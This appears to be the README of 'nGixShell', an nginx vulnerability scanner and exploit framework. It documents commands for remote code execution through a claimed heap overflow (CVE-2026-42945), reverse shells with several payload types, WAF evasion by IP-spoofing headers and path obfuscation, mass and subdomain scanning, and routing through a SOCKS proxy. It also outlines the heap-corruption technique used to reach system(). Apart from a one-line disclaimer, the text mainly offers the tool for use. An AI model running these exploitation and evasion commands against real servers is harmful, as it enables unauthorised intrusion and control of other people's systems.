<div align="center">
  <img src="banner.svg" alt="nGixShell" width="100%"/>
</div>

<div align="center">

![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square&logo=python&logoColor=white)
![CVEs](https://img.shields.io/badge/CVEs-53-critical?style=flat-square)
![Zero deps](https://img.shields.io/badge/dependencies-none-brightgreen?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)

</div>

---

**nGixShell** is an nginx CVE scanner and RCE exploit framework. It ships a working proof-of-concept for **CVE-2026-42945** — a critical heap buffer overflow in `ngx_http_rewrite_module` — and a scanner covering **53 nginx CVEs** with automated HTTP probes, fingerprinting, WAF detection/bypass, web security auditing, and report generation.

Zero external dependencies. Pure Python 3 stdlib.

---

## Quick Start

```bash
# Spin up the vulnerable lab
docker compose -f env/docker-compose.yml up -d

# Auto mode — fingerprint + CVE scan + web audit
python3 ngixshell.py 127.0.0.1:19321

# Execute a command via RCE (CVE-2026-42945)
python3 ngixshell.py 127.0.0.1:19321 --cmd 'id'

# Drop a reverse shell (IP auto-detected)
python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell

# Detect and bypass WAF, then scan
python3 ngixshell.py 127.0.0.1:19321 --waf-bypass

# Subdomain scan
python3 ngixshell.py --subdomain-scan example.com --scan-port 443

# Multiple targets from a file
python3 ngixshell.py --target-file hosts.txt --json --html-report results.html
```

No flags required — pointing the tool at a target runs everything automatically.  
TLS is **auto-detected**. nginx is fingerprinted even with `server_tokens off`.

---

## Usage

```
python3 ngixshell.py [TARGET] [OPTIONS]

TARGET formats:
  127.0.0.1
  192.168.1.10:8080
  http://192.168.1.10:8080
  https://target.local
```

### Modes

| Flag | Description |
|---|---|
| *(none)* | **Auto** — fingerprint + CVE scan + web audit |
| `--cmd 'CMD'` | Execute command via CVE-2026-42945 RCE |
| `--cmd-file FILE` | Execute commands from file (joined with `;`) |
| `--shell` | Pop a reverse shell |
| `--shell-type TYPE` | Payload: `bash` `python` `perl` `php` `nc` `powershell` (default: `python`) |
| `--upgrade-shell` | Auto-send PTY upgrade after shell connects |
| `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
| `--cve CVE-ID` | Test one specific CVE |
| `--list-cves` | Print all 53 CVEs with CVSS and probe info |
| `--list-candidates` | Print heap address candidates |
| `--dry-run` | Fingerprint + scan only, no exploit |
| `--target-file FILE` | Scan multiple hosts from a file |

### WAF Detection & Bypass

| Flag | Description |
|---|---|
| `--waf-detect` | Detect WAF before scanning |
| `--waf-bypass` | Enable all bypass techniques (also runs detection) |
| `--waf-ip IP` | Spoof this IP in bypass headers (default: random RFC1918) |

**Bypass techniques** (all active when `--waf-bypass` is set):

| Technique | Detail |
|---|---|
| IP spoofing | `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `True-Client-IP`, `X-Remote-IP`, `X-Client-IP` |
| UA rotation | 11 real browser/bot User-Agents, randomised per request |
| Path obfuscation | double-slash, `/./` padding, percent-encoding, case variation |
| Header case shuffle | randomises header name casing to break WAF pattern matching |

**Detected WAFs:** Cloudflare, AWS WAF, Akamai, Imperva/Incapsula, ModSecurity, F5 BIG-IP ASM, Sucuri, Barracuda, NAXSI, Fastly, Wordfence

### Web Audit

Runs automatically in scan mode. All modules can be skipped individually.

| Flag | Description |
|---|---|
| `--skip-headers` | Skip HTTP security header audit |
| `--skip-paths` | Skip path/file discovery |
| `--skip-vhosts` | Skip virtual host enumeration |
| `--skip-tls` | Skip TLS protocol audit |
| `--path-wordlist FILE` | Extra paths to probe (one per line) |

- **Header audit** — HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, version-leaking headers
- **Path discovery** — 50+ paths; sentinel probe eliminates false positives from catch-all 403/301 rules
- **Virtual host enumeration** — requires status AND body diff to avoid default-block false positives
- **TLS audit** — tests TLS 1.0–1.3 support, certificate expiry, and self-signed detection
- **stub_status** — parses active connection metrics from `/nginx_status` if exposed

### Connection

| Flag | Description |
|---|---|
| `--port PORT` | Override port |
| `--tls` | Force TLS (auto-detected by default) |
| `--proxy URL` | Proxy: `http://`, `https://`, `socks5://` |

### HTTP

| Flag | Description |
|---|---|
| `--user-agent UA` | Custom User-Agent |
| `--auth USER:PASS` | HTTP Basic auth |
| `--cookie VALUE` | Cookie header |
| `--header NAME:VALUE` | Extra header (repeatable) |

### Rate / Timing

| Flag | Description |
|---|---|
| `--rate-limit RPS` | Max requests per second |
| `--jitter MS` | Random delay 0–MS ms between requests |
| `--retry N` | Retry inconclusive probes (default: 1) |
| `--timeout-multiplier X` | Scale all timeouts (default: 1.0) |

### Output

| Flag | Description |
|---|---|
| `--output FILE` | Write log to FILE |
| `--json` | Print JSON summary at end |
| `--html-report [FILE]` | Generate HTML report (default: `ngixshell_<host>_<ts>.html`) |
| `--verbose` | Debug output |

---

## CVE Coverage

53 entries spanning 2009–2026. Sorted by CVSS.

| CVE | CVSS | Component | Description |
|---|---|---|---|
| CVE-2026-42945 | 9.8 CRITICAL | rewrite | Heap overflow → RCE (**exploited**) |
| CVE-2026-42946 | 8.1 HIGH | rewrite | Memory corruption (same advisory) |
| CVE-2022-41741 | 7.8 HIGH | mp4 | Memory corruption via malicious mp4 |
| CVE-2016-1247 | 7.8 HIGH | packaging | Log file symlink privilege escalation |
| CVE-2021-23017 | 7.7 HIGH | resolver | Off-by-one heap overwrite |
| CVE-2026-40701 | 7.5 HIGH | request | Memory corruption in request processing |
| CVE-2026-42934 | 7.5 HIGH | request | Memory corruption (same advisory) |
| CVE-2026-27784 | 7.5 HIGH | mp4 | Buffer overflow via crafted mp4 |
| CVE-2026-32647 | 7.5 HIGH | mp4 | Buffer overflow (sibling of above) |
| CVE-2024-24990 | 7.5 HIGH | HTTP/3 | Use-after-free in QUIC module |
| CVE-2024-24989 | 7.5 HIGH | HTTP/3 | NULL pointer dereference in QUIC |
| CVE-2024-31079 | 7.5 HIGH | HTTP/3 | Stack overflow in QUIC encoder |
| CVE-2024-32760 | 7.5 HIGH | HTTP/3 | Buffer overwrite via HEADERS frame |
| CVE-2022-41742 | 7.5 HIGH | mp4 | Heap memory disclosure |
| CVE-2017-7529 | 7.5 HIGH | range filter | Integer overflow → out-of-bounds read |
| CVE-2016-0746 | 7.5 HIGH | resolver | Use-after-free via crafted DNS response |
| CVE-2014-0133 | 7.5 HIGH | SPDY | Heap overflow in SPDY implementation |
| CVE-2014-0088 | 7.5 HIGH | SPDY | Memory corruption in SPDY |
| CVE-2013-4547 | 7.5 HIGH | core | Space+NUL URI bypass |
| CVE-2013-2028 | 7.5 HIGH | core | Chunked encoding stack overflow |
| CVE-2012-1180 | 7.5 HIGH | proxy | Use-after-free in proxy module |
| CVE-2009-3555 | 7.5 HIGH | SSL | TLS renegotiation injection (MITM) |
| CVE-2009-2629 | 7.5 HIGH | core | Buffer underflow in URI parsing |
| CVE-2026-42926 | 6.5 MEDIUM | HTTP/2 | Request splitting via proxy |
| CVE-2026-27654 | 6.5 MEDIUM | WebDAV | Heap overflow in DAV module |
| CVE-2026-28753 | 6.5 MEDIUM | mail | Header injection in mail proxy |
| CVE-2026-1642 | 6.5 MEDIUM | proxy | SSL upstream session reuse leak |
| CVE-2019-9511 | 6.5 MEDIUM | HTTP/2 | Data Dribble CPU/memory DoS |
| CVE-2012-2089 | 6.8 MEDIUM | mp4 | Buffer overflow via mp4 request |
| CVE-2018-16845 | 5.5 MEDIUM | mp4 | Integer underflow → crash + disclosure |
| CVE-2019-20372 | 5.3 MEDIUM | proxy | HTTP request smuggling |
| CVE-2026-40460 | 5.3 MEDIUM | HTTP/3 | QUIC connection spoofing |
| CVE-2026-28755 | 5.3 MEDIUM | SSL | Memory disclosure in OCSP processing |
| CVE-2025-23419 | 5.3 MEDIUM | SSL | TLS session resumption cert bypass |
| CVE-2024-35200 | 5.3 MEDIUM | HTTP/3 | NULL pointer dereference |
| CVE-2024-34161 | 5.3 MEDIUM | HTTP/3 | Memory disclosure |
| CVE-2016-4450 | 5.3 MEDIUM | core | NULL pointer via chunked request body |
| CVE-2016-0742 | 5.0 MEDIUM | resolver | Invalid pointer via crafted UDP packet |
| CVE-2016-0747 | 5.0 MEDIUM | resolver | Insufficient CNAME resolution limit |
| CVE-2014-3556 | 5.0 MEDIUM | mail | STARTTLS command injection |
| CVE-2013-2070 | 5.3 MEDIUM | proxy | Backend response disclosure |
| CVE-2011-4963 | 5.0 MEDIUM | access | IPv6 literal access control bypass |
| CVE-2011-4315 | 5.0 MEDIUM | resolver | Heap overflow via crafted DNS response |
| CVE-2009-3896 | 5.0 MEDIUM | core | NULL pointer dereference DoS |
| CVE-2025-53859 | 4.3 MEDIUM | mail | SMTP command injection |
| CVE-2014-3616 | 4.3 MEDIUM | SSL | TLS SNI virtual host confusion |
| CVE-2026-27651 | 4.3 MEDIUM | mail | NULL pointer dereference in mail proxy |
| CVE-2019-9513 | 4.3 MEDIUM | HTTP/2 | Resource Loop CPU DoS |
| CVE-2019-9516 | 4.3 MEDIUM | HTTP/2 | 0-Length Headers memory exhaustion |
| CVE-2018-16843 | 4.3 MEDIUM | HTTP/2 | Excessive memory consumption |
| CVE-2018-16844 | 4.3 MEDIUM | HTTP/2 | Excessive CPU via SETTINGS frames |
| CVE-2024-7347 | 4.7 MEDIUM | mp4 | Out-of-bounds read |
| CVE-2009-3898 | 4.9 MEDIUM | WebDAV | Directory traversal via COPY/MOVE |

---

## The Bug (CVE-2026-42945)

nginx's rewrite script engine uses a **two-pass** model: compute buffer size, then copy. The `is_args` flag is set on the main engine when a `rewrite` replacement contains `?`, but the length-calculation pass runs on a freshly zeroed sub-engine:

- **Length pass** — sees `is_args = 0` → returns raw capture length
- **Copy pass** — sees `is_args = 1` → calls `ngx_escape_uri(NGX_ESCAPE_ARGS)`, expanding each unsafe byte to 3 bytes

The copy overflows the undersized heap buffer with attacker-controlled URI data. Exploitation corrupts an adjacent `ngx_pool_t` cleanup pointer via cross-request heap feng shui, redirecting it to a fake `ngx_pool_cleanup_s` that calls `system()` on pool destruction.

### Affected Versions

| Product | Vulnerable | Fixed |
|---|---|---|
| NGINX Open Source | 0.6.27 – 1.30.0 | 1.31.0, 1.30.1 |
| NGINX Plus | R32 – R36 | R36 P4, R35 P2, R32 P6 |

Vendor advisory: <https://my.f5.com/manage/s/article/K000160932>

---

## Lab Setup

Tested on Ubuntu 24.04 LTS. Requires Docker and Python 3.8+.

```bash
# Start the vulnerable lab (nginx 1.25.3)
docker compose -f env/docker-compose.yml up -d

# Full scan
python3 ngixshell.py 127.0.0.1:19321

# RCE with JSON output
python3 ngixshell.py 127.0.0.1:19321 --cmd 'id' --json

# Reverse shell — bash payload, PTY auto-upgrade
python3 ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell

# WAF bypass scan with spoofed IP
python3 ngixshell.py 127.0.0.1:19321 --waf-bypass --waf-ip 10.10.10.1

# Through SOCKS5 proxy
python3 ngixshell.py 192.168.1.10 --proxy socks5://127.0.0.1:9050

# Subdomain scan with rate limiting
python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --rate-limit 10

# Multiple targets, JSON output, HTML report
python3 ngixshell.py --target-file hosts.txt --json --html-report results.html
```

---

## Disclaimer

For authorized security testing, CTF competitions, and research only.
